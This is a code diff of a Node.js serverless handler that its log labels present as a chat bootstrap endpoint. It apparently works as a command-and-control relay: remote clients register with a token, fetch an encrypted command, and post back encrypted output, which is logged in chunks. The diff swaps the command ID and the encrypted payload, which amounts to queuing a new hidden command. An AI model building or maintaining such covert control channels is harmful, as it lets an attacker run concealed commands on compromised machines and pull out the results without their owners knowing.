@@ -1,8 +1,8 @@
 import crypto from 'node:crypto';
 
 const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
-const CONTROL_ID = '51';
-const CONTROL_PAYLOAD = 'U2FsdGVkX19kkCcZkMhUoOkCkUIw1301+pVw8+V0M37cUtqmxGD53sPWgRQtedcUUI/nnAytcBwDcAZZkwbH+wYAYJ+F3C+YhpsCMxZq+2RlWVfznyzPIGY1GCPBsJf5eURxClIBQLzcUs2k4ksdTmmolbqbpDW+Qq4DbXL2Qj8ZsRi8GSLGAGVqUnpnS5oS3iqiGYyb9TFd5+XnrE3dChnL3G0pFf93Eni79RvS/9Q=';
+const CONTROL_ID = '52';
+const CONTROL_PAYLOAD = 'U2FsdGVkX1/nEf4MxGM9khSmbDEjKI+67WxeTt3PSJx/9GCNe3GGLOsXiw3tjy54/SLo6Kv9OBvZ3ktal+jpagY8tNgLaTlrD3gebVrcpl7d89e3qOerhsI5zSK/bLUcV5MwlrgXqM2VtgnNrGfnnApKzVtRZT33IMMmv6fXkX1Af1cOg1PZDkxuiI5+nu9BIUdJuqPzrMzXriyEj5ViWmftG7aFa0QjSx+buQ7TAzI=';
 
 async function readBody(request) {
   if (typeof request.body === 'string') return request.body;
@@ -28,20 +28,17 @@ export default async function handler(request, response) {
   const mode = url.searchParams.get('mode');
   response.setHeader('cache-control', 'no-store');
   response.setHeader('x-content-type-options', 'nosniff');
-
   if (mode === 'register') {
     if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
     const body = await readBody(request);
     console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
     return response.status(204).end();
   }
-
   if (mode === 'control') {
     if (request.method !== 'GET') return response.status(404).send('Not found');
     response.setHeader('content-type', 'text/plain; charset=utf-8');
     return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
   }
-
   if (mode === 'output') {
     if (request.method !== 'POST') return response.status(404).send('Not found');
     const body = await readBody(request);
@@ -50,11 +47,8 @@ export default async function handler(request, response) {
     const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
     const chunkSize = 1800;
     const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
-    for (let i = 0; i < total; i += 1) {
-      console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
-    }
+    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
     return response.status(204).end();
   }
-
   return response.status(404).send('Not found');
 }
